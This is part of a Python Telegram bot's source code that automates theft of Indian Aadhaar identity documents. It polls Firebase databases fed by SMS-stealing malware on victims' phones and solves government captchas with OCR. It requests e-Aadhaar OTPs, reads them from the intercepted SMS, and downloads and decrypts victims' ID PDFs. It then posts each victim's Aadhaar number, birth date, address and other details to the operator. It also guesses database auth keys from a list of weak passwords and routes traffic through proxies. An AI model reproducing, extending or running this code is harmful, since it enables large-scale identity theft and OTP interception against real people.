            send_msg(cid, f"{BOT_NAME}\n{DIVIDER}\n✗ Stopped.")
            break
        mob = dev["phone"]
        with used_lock:
            if mob in used_numbers:
                continue
            used_numbers.add(mob)
        done += 1
        dbn = dev["db_url"].split("//")[1].split("-default")[0]

        m = send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b>\n\n"
                          f"◈ 📱 {mob}\n◈ 🔋 {dev['battery']}% | 💾 {dbn}\n<i>◌ Fetching name...</i>")
        mid = m.get('result', {}).get('message_id')

        name = "MR"
        try:
            r = requests.get(f"{NAME_API}{mob}", timeout=8)
            if r.status_code == 200:
                fn = r.json().get('name', '').strip()
                if fn and fn.lower() not in ['unknown', 'n/a', '']:
                    name = fn.upper()
        except:
            pass

        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n<i>◌ Captcha...</i>")

        eids = fb_msgids(dev["db_url"], dev["db_auth"], dev["dev_id"])

        # --- EID OTP ---
        sent = False
        etxn = cs = ct = None
        lerr = ""
        for a in range(1, 6):
            if stop and stop.is_set():
                break
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n<i>◌ Captcha {a}/5...</i>")
            img, cx, tx = get_captcha()
            if not img:
                lerr = "Captcha unavailable"
                time.sleep(1)
                continue
            code = solve_cap(img)
            if not code:
                lerr = "Captcha unsolved"
                continue
            ok, txn, err = send_eid_otp(mob, name, code, cx, tx)
            if ok:
                sent = True
                etxn = txn
                cs = code
                ct = cx
                break
            else:
                lerr = err or "Unknown"
                if "captcha" not in str(err).lower() and "invalid" not in str(err).lower():
                    break
                time.sleep(1)

        if not sent:
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ OTP failed: {lerr}")
            continue

        wait_min = max(1, OTP_WAIT_SECONDS // 60)
        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n"
                               f"✓ OTP sent!\n<i>◌ Waiting SMS ({wait_min}min)...</i>")

        otp, _ = fb_otp_filtered(
            dev["db_url"], dev["db_auth"], dev["dev_id"], eids,
            timeout=OTP_WAIT_SECONDS,
            require_keywords=None,
            exclude_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
        )
        if not otp:
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ No OTP received")
            continue

        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | OTP:{otp}\n<i>◌ Verifying EID...</i>")
        ok2, eid, vn = verify_eid(mob, name, otp, etxn, ct, cs)
        if not ok2:
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ EID failed: {vn}")
            continue
        if not vn or not vn.strip():
            vn = name

        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n◈ EID: {eid}\n<i>◌ PDF OTP...</i>")
        eids2 = fb_msgids(dev["db_url"], dev["db_auth"], dev["dev_id"])
        psent = False
        ptxn = t2 = None
        for a in range(1, 6):
            if stop and stop.is_set():
                break
            i2, c2, t2 = get_captcha()
            if not i2:
                time.sleep(1)
                continue
            cd2 = solve_cap(i2)
            if not cd2:
                continue
            o3, tx3, m3 = send_aadh_otp(eid, cd2, c2, t2)
            if o3:
                psent = True
                ptxn = tx3
                break
            if "captcha" not in str(m3).lower():
                break
            time.sleep(1)

        if not psent:
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob} | EID:{eid}\n✗ PDF OTP failed")
            continue

        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn} | EID:{eid}\n"
                               f"<i>◌ Waiting PDF OTP ({wait_min}min)...</i>")

        potp, _ = fb_otp_filtered(
            dev["db_url"], dev["db_auth"], dev["dev_id"], eids2,
            timeout=OTP_WAIT_SECONDS,
            require_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
        )
        if not potp:
            logger.warning(f"[PDF-OTP] filter missed, unfiltered fallback")
            potp, _ = fb_otp_filtered(
                dev["db_url"], dev["db_auth"], dev["dev_id"], eids2,
                timeout=30,
            )
        if not potp:
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ PDF OTP timeout")
            continue

        # --- Download PDF ---
        if mid:
            edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n"
                               f"◈ EID:{eid} OTP:{potp}\n<i>◌ Downloading PDF...</i>")
        try:
            o4, enc_pdf = dl_pdf(eid, potp, ptxn, t2, chat_id=cid)
            if not (o4 and enc_pdf and os.path.exists(enc_pdf)):
                if mid:
                    edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n✗ Download: {str(enc_pdf)[:150]}")
                continue

            logger.info(f"[DECRYPT] encrypt-pdf={enc_pdf}, cracking...")

            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n"
                                   f"<i>◌ Unlocking PDF...</i>")

            dec_pdf = decrypt_pdf_auto(enc_pdf, vn)

            if not dec_pdf or not os.path.exists(dec_pdf):
                logger.warning(f"[DECRYPT] failed for {vn} — sending encrypted PDF")
                send_doc(cid, enc_pdf, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠ <b>Encrypted PDF</b> (password: first 4 letters + YoB)\n\n"
                                       f"◈ Name · {vn}\n◈ Phone · {mob}\n◈ EID · {eid}")
                wins += 1
                try:
                    os.remove(enc_pdf)
                except:
                    pass
                continue

            # Extract details from the DECRYPTED PDF
            details = extract_aadhaar_details(dec_pdf) or {}
            d_name = details.get('name') or vn
            d_dob = details.get('dob') or 'N/A'
            d_yob = details.get('year_of_birth') or ''
            d_gender = details.get('gender') or 'N/A'
            d_aadhaar = details.get('aadhaar') or 'N/A'
            if d_aadhaar != 'N/A':
                clean = re.sub(r'[^0-9]', '', d_aadhaar)
                if len(clean) == 12:
                    d_aadhaar_display = f"{clean[:4]} {clean[4:8]} {clean[8:]}"
                else:
                    d_aadhaar_display = d_aadhaar
            else:
                d_aadhaar_display = d_aadhaar
            d_vid = details.get('vid') or ''
            if d_vid:
                vc = re.sub(r'[^0-9]', '', d_vid)
                if len(vc) == 16:
                    d_vid_display = f"{vc[:4]} {vc[4:8]} {vc[8:12]} {vc[12:]}"
                else:
                    d_vid_display = d_vid
            else:
                d_vid_display = ''
            d_father = details.get('father_name') or ''
            d_address = details.get('address') or 'N/A'
            d_district = details.get('district') or ''
            d_state = details.get('state') or ''
            d_pincode = details.get('pincode') or ''
            d_phone = details.get('phone') or ''
            d_email = details.get('email') or ''
            d_blood = details.get('blood_group') or ''
            d_issued = details.get('issued_date') or ''
            d_age = details.get('age') or ''

            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✅ 〕</b>\n"
                                   f"◈ 📱 {mob}\n◈ 👤 {d_name}\n◈ 🆔 {eid}\n<i>◌ Sending...</i>")

            # Send decrypted PDF
            send_doc(cid, dec_pdf, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>✅ Aadhaar PDF (Unlocked)</b>\n\n"
                                   f"◈ Name · {d_name}\n◈ Phone · {mob}\n◈ EID · {eid}")

            # Send details card (bot55 style)
            msg = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>〔 Aadhaar Card Details 〕</b>\n\n"
                f"<b>▸ Personal Information</b>\n"
                f"  👤  Name        →  <b>{d_name}</b>\n"
                f"  ⚥   Gender      →  {d_gender}\n"
                f"  📅  DOB         →  {d_dob}\n"
            )
            if d_yob and d_yob != d_dob:
                msg += f"  📆  Year of Birth →  {d_yob}\n"
            if d_age:
                msg += f"  🎂  Age         →  {d_age} years\n"
            msg += f"  🆔  Aadhaar     →  <code>{d_aadhaar_display}</code>\n"
            if d_vid_display:
                msg += f"  🔑  VID         →  <code>{d_vid_display}</code>\n"
            if d_blood:
                msg += f"  🩸  Blood Group →  {d_blood}\n"
            if d_father:
                msg += f"  👨  Father/Husband →  {d_father}\n"
            msg += f"\n<b>▸ Address Details</b>\n  📍  Address     →  {d_address}\n"
            if d_district:
                msg += f"  🏛️  District    →  {d_district}\n"
            if d_state:
                msg += f"  🗺️  State       →  {d_state}\n"
            if d_pincode:
                msg += f"  📮  Pincode     →  <code>{d_pincode}</code>\n"
            msg += f"\n<b>▸ Contact Details</b>\n"
            msg += f"  📱  Phone       →  {d_phone or mob}\n"
            msg += f"  📧  Email       →  {d_email or 'N/A'}\n"
            if d_issued:
                msg += f"\n<b>▸ Document Info</b>\n  📋  Issued Date →  {d_issued}\n"
            msg += f"\n{DIVIDER}\n<i>◌  PDF delivered without password.</i>"

            send_msg(cid, msg)

            wins += 1
            try:
                os.remove(enc_pdf)
            except:
                pass
            try:
                if dec_pdf != enc_pdf:
                    os.remove(dec_pdf)
            except:
                pass

        except Exception as e:
            logger.exception("[PDF] flow error")
            if mid:
                edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Error: {str(e)[:120]}")

    send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🏁 Complete</b>\n\n"
                  f"◈ Processed · {done}\n◈ Success · {wins} PDFs\n\n<i>/auto again | /resetused</i>")
    auto_running.pop(cid, None)


# ============== COMMANDS ==============
def handle(cid, text):
    if int(cid) not in OWNER_IDS:
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Access denied.")
        return

    parts = text.strip().split(None, 1)
    cmd = parts[0].lower()

    if cmd in ['/help', '/start']:
        send_msg(cid,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Commands 〕</b>\n\n"
            f"🔥 <b>Firebase:</b>\n"
            f"  /addfire <code>URL</code>\n"
            f"  /removefire <code>URL</code> | all\n"
            f"  /listfire\n\n"
            f"📱 <b>Auto-OTP:</b>\n"
            f"  /scan\n"
            f"  /auto [N]\n"
            f"  /stopauto\n"
            f"  /resetused\n\n"
            f"🔬 <b>Debug:</b>\n"
            f"  /debugscan /debugusers /debugmsgs\n\n"
            f"🌐 <b>Proxy:</b>\n"
            f"  /reloadproxy /proxystatus /testproxy\n\n"
            f"⚙️ /status · /help")

    elif cmd == '/addfire':
        if len(parts) < 2:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/addfire URL</code>")
            return
        raw = parts[1].strip()
        lines = [l.strip() for l in raw.split('\n') if l.strip()]
        added = 0
        need_auth = []
        exists = 0
        status = send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Processing {len(lines)} URL(s)...</i>")
        sid = status.get('result', {}).get('message_id')

        for line in lines:
            if 'firebaseio.com' not in line and 'firebasedatabase.app' not in line:
                continue
            url = line
            auth = ""
            if line.count(':') >= 3:
                idx = line.rfind(':')
                maybe_url = line[:idx]
                maybe_auth = line[idx + 1:].strip()
                if (('/' not in maybe_auth) and (len(maybe_auth) < 64) and
                        ('firebaseio.com' in maybe_url or 'firebasedatabase.app' in maybe_url)):
                    url = maybe_url
                    auth = maybe_auth
            if not url.startswith('http'):
                url = 'https://' + url

            with firebase_lock:
                if any(d['url'] == url for d in firebase_dbs):
                    exists += 1
                    continue

            verified_auth = None
            if auth:
                j = fb_get(url, "clients.json?shallow=true", auth, timeout=8)
                if isinstance(j, dict):
                    verified_auth = auth
            if verified_auth is None:
                j = fb_get(url, "clients.json?shallow=true", "", timeout=8)
                if isinstance(j, dict):
                    verified_auth = ""
            if verified_auth is None:
                for ta in ["B", "123456", "Very", "test", "737374", "373747", "1234", "admin", "12345"]:
                    j = fb_get(url, "clients.json?shallow=true", ta, timeout=6)
                    if isinstance(j, dict):
                        verified_auth = ta
                        break
            if verified_auth is not None:
                with firebase_lock:
                    firebase_dbs.append({"url": url, "auth": verified_auth})
                added += 1
            else:
                need_auth.append(url)

        if need_auth:
            _pending_urls[cid] = need_auth
            names = "\n".join([u.split('//')[1].split('-default')[0] if '-default' in u else u[:40] for u in need_auth])
            msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            if added:
                msg_text += f"✅ {added} added\n"
            if exists:
                msg_text += f"ℹ️ {exists} already present\n"
            msg_text += f"\n<b>🔒 {len(need_auth)} need auth:</b>\n<code>{names}</code>\n\n<i>◌ Send auth key:</i>"
            if sid:
                edit_msg(cid, sid, msg_text)
            else:
                send_msg(cid, msg_text)
        else:
            with firebase_lock:
                total = len(firebase_dbs)
            msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s)"
            if exists:
                msg_text += f"\nℹ️ Skipped {exists}"
            msg_text += f"\n📊 Total: {total}"
            if sid:
                edit_msg(cid, sid, msg_text)
            else:
                send_msg(cid, msg_text)

    elif cmd == '/removefire':
        if len(parts) < 2:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ /removefire URL or /removefire all")
            return
        t = parts[1].strip().lower()
        if t == 'all':
            with firebase_lock:
                c = len(firebase_dbs)
                firebase_dbs.clear()
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Removed all {c} DBs.")
        else:
            with firebase_lock:
                b = len(firebase_dbs)
                firebase_dbs[:] = [d for d in firebase_dbs if t not in d['url'].lower()]
                rm = b - len(firebase_dbs)
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Removed {rm}. Left: {len(firebase_dbs)}")

    elif cmd == '/listfire':
        with firebase_lock:
            dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Empty.\n<i>/addfire URL</i>")
            return
        ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Firebase ({len(dbs)}) 〕</b>\n"]
        for i, d in enumerate(dbs, 1):
            n = d['url'].split('//')[1].split('-default')[0] if '-default' in d['url'] else d['url'][:40]
            a = d['auth'] if d['auth'] else "no-auth"
            ls.append(f"{i}. <code>{n}</code> | {a[:10]}")
        send_msg(cid, "\n".join(ls))

    elif cmd == '/scan':
        with firebase_lock:
            if not firebase_dbs:
                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs. /addfire")
                return
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
        devs = fb_scan()
        if not devs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.")
            return
        ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices (unique)</b>\n"]
        for i, d in enumerate(devs[:50], 1):
            dn = d["db_url"].split("//")[1].split("-default")[0]
            ls.append(f"{i}. <code>{d['phone']}</code> | 🔋{d['battery']} | {dn}")
        ls.append(f"\n<b>Total: {len(devs)}</b>\n<i>/auto {len(devs)}</i>")
        send_msg(cid, "\n".join(ls))

    elif cmd == '/debugscan':
        with firebase_lock:
            dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs.")
            return
        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔍 Debug Scan</b>"]
        for db in dbs:
            url = db['url'].rstrip('/')
            auth = db['auth']
            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:40]}</code>")
            try:
                r = requests.get(fb_url(url, "clients.json", auth), timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict):
                        online = sum(1 for d in data.values() if _is_online(d))
                        report.append(f"◈ total clients: <b>{len(data)}</b>")
                        report.append(f"◈ online: <b>{online}</b>")
            except Exception as e:
                report.append(f"◈ ERROR: {str(e)[:120]}")
            try:
                bu = fb_get(url, "bot_users.json", auth, timeout=8)
                if isinstance(bu, dict):
                    report.append(f"◈ bot_users: <b>{len(bu)}</b>")
            except:
                pass
        full = "\n".join(report)
        for i in range(0, len(full), 3800):
            send_msg(cid, full[i:i + 3800])

    elif cmd == '/debugusers':
        with firebase_lock:
            dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs.")
            return
        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths</b>"]
        for db in dbs[:1]:
            url = db['url'].rstrip('/')
            auth = db['auth']
            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:45]}</code>")
            for path in ["users", "user_data", "All_User", "All_Users",
                         "registeredDevices", "Verify_Device", "devices",
                         "panel", "bot_users", "bookings", "profex_incoming",
                         "settings", "commands", "sendSms"]:
                try:
                    j = fb_get(url, f"{path}.json", auth, timeout=12)
                    if not j:
                        report.append(f"◈ /{path} → empty")
                        continue
                    if isinstance(j, dict):
                        keys = list(j.keys())
                        report.append(f"\n<b>/{path}</b> ({len(keys)} keys)")
                        for k in keys[:2]:
                            v = j[k]
                            report.append(f"  key=<code>{str(k)[:26]}</code>")
                            if isinstance(v, dict):
                                report.append(f"     fields: {', '.join(list(v.keys())[:10])}")
                    elif isinstance(j, list):
                        report.append(f"\n<b>/{path}</b> (list[{len(j)}])")
                except Exception as e:
                    report.append(f"◈ /{path} err: {str(e)[:80]}")
        full = "\n".join(report)
        for i in range(0, len(full), 3800):
            send_msg(cid, full[i:i + 3800])

    elif cmd == '/debugmsgs':
        if len(parts) < 2:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/debugmsgs &lt;deviceId&gt;</code>")
            return
        did = parts[1].strip()
        with firebase_lock:
            dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs.")
            return
        url = dbs[0]['url'].rstrip('/')
        auth = dbs[0]['auth']
        try:
            q = fb_url(url, f"messages/{did}.json?orderBy=%22%24key%22&limitToLast=10", auth)
            r = requests.get(q, timeout=12)
            if r.status_code != 200:
                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ HTTP {r.status_code}")
                return
            j = r.json()
            if not j:
                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ empty")
                return
            lines = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📩 last 10 for {did[:14]}</b>\n"]
            for mid, md in sorted(j.items(), reverse=True)[:10]:
                if isinstance(md, dict):
                    body = md.get("message", "") or md.get("body", "") or md.get("msg", "")
                    sender = md.get("sender", "")
                    lines.append(f"• <b>{sender[:20]}</b>\n  <code>{str(body)[:180]}</code>")
            send_msg(cid, "\n".join(lines))
        except Exception as e:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ {str(e)[:120]}")

    elif cmd == '/auto':
        cnt = 5
        if len(parts) > 1 and parts[1].strip().isdigit():
            cnt = int(parts[1].strip())
        if cid in auto_running and not auto_running[cid].is_set():
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Already running!")
            return
        auto_running[cid] = threading.Event()
        threading.Thread(target=auto_worker, args=(cid, cnt), daemon=True).start()

    elif cmd == '/stopauto':
        if cid in auto_running:
            auto_running[cid].set()
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✓ Stopping...")
        else:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Nothing running.")

    elif cmd == '/resetused':
        with used_lock:
            c = len(used_numbers)
            used_numbers.clear()
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Cleared {c} numbers.")

    elif cmd == '/reloadproxy':
        load_proxies()
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Proxies reloaded: <b>{len(PROXY_POOL)}</b>")

    elif cmd == '/proxystatus':
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🌐 Proxies loaded: <b>{len(PROXY_POOL)}</b>\nFile: <code>{PROXY_FILE}</code>")

    elif cmd == '/testproxy':
        if not PROXY_POOL:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No proxies.")
            return
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Testing first 3...</i>")
        results = []
        for p in PROXY_POOL[:3]:
            ok, info = test_proxy(p, timeout=15)
            safe = p.split("@")[-1]
            results.append(f"{'✓' if ok else '✗'} <code>{safe}</code>\n   {info}")
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🌐 Proxy Test</b>\n\n" + "\n\n".join(results))

    elif cmd == '/status':
        with firebase_lock:
            dc = len(firebase_dbs)
        with used_lock:
            uc = len(used_numbers)
        ar = sum(1 for e in auto_running.values() if not e.is_set())
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n"
                      f"◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n"
                      f"◈ Proxies · {len(PROXY_POOL)}\n◈ OTP Wait · {OTP_WAIT_SECONDS}s\n"
                      f"◈ PyPDF2 · {'✓' if _HAS_PYPDF2 else '✗'}\n"
                      f"◈ OCR · {'✓' if ocr_solver else '✗'}")


# ============== MAIN ==============
def main():
    print("=" * 50, flush=True)
    print(f"  {BOT_NAME}", flush=True)
    print("=" * 50, flush=True)

    load_proxies()

    try:
        r = tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10).json()
        if r.get('ok'):
            print(f"  @{r['result']['username']}  |  OCR: {'OK' if ocr_solver else 'NO'}  |  PyPDF2: {'OK' if _HAS_PYPDF2 else 'NO'}  |  Proxies: {len(PROXY_POOL)}", flush=True)
        else:
            print(f"  getMe failed: {r}", flush=True)
            return
    except Exception as e:
        print(f"  getMe exception: {e}", flush=True)
        return

    print("=" * 50, flush=True)
    print("  Running — Ctrl+C to stop", flush=True)
    print("=" * 50, flush=True)

    off = 0
    while True:
        try:
            ups = get_updates(off + 1 if off else None)
            for u in ups:
                off = u.get('update_id', off)
                msg = u.get('message')
                if not msg:
                    continue
                cid = msg['chat']['id']
                txt = msg.get('text', '').strip()
                if txt.startswith('/'):
                    handle(cid, txt)
                elif cid in _pending_urls and txt:
                    auth = txt.strip()
                    urls = _pending_urls.pop(cid)
                    added = 0
                    for url in urls:
                        with firebase_lock:
                            if not any(d['url'] == url for d in firebase_dbs):
                                firebase_dbs.append({"url": url, "auth": auth})
                                added += 1
                    with firebase_lock:
                        total = len(firebase_dbs)
                    send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s) with auth: <code>{auth}</code>\n📊 Total: {total}")
        except KeyboardInterrupt:
            print("\nBye!", flush=True)
            break
        except Exception as e:
            logger.error(f"Loop: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
